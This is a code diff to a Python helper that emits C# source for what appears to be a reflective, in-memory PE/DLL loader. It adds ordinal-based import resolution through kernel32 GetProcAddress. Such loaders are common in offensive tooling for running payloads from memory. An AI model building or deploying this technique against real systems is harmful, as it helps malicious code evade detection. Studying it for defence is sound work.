@@ -426,6 +426,7 @@ def _compile_native_loader_dll(cls_name: str) -> bytes | None:
         "  [DllImport(\"kernel32\")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n"
         "  [DllImport(\"kernel32\")] static extern IntPtr LoadLibraryA(string n);\n"
         "  [DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr m,string n);\n"
+        "  [DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr m,IntPtr n);\n"
         "  [DllImport(\"kernel32\")] static extern void RtlMoveMemory(IntPtr d,byte[] s,UIntPtr n);\n"
         "  [DllImport(\"kernel32\")] static extern void RtlMoveMemory(IntPtr d,IntPtr s,UIntPtr n);\n"
         # Parse IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS
@@ -509,7 +510,7 @@ def _compile_native_loader_dll(cls_name: str) -> bytes | None:
         "          if(thunk==0)break;\n"
         "          IntPtr fnAddr;\n"
         "          bool byOrd=pe64?(thunk<0):((thunk&0x80000000L)!=0);\n"
-        "          if(byOrd){ fnAddr=GetProcAddress(hMod,(string)null);/*ordinal-TODO*/}\n"
+        "          if(byOrd){ fnAddr=GetProcAddress(hMod,new IntPtr((long)(thunk&0xFFFF)));}\n"
         "          else{\n"
         "            int nameRVA=(int)(thunk&0x7FFFFFFF);\n"
         "            string fn=Marshal.PtrToStringAnsi(new IntPtr(imgBase.ToInt64()+nameRVA+2));\n"
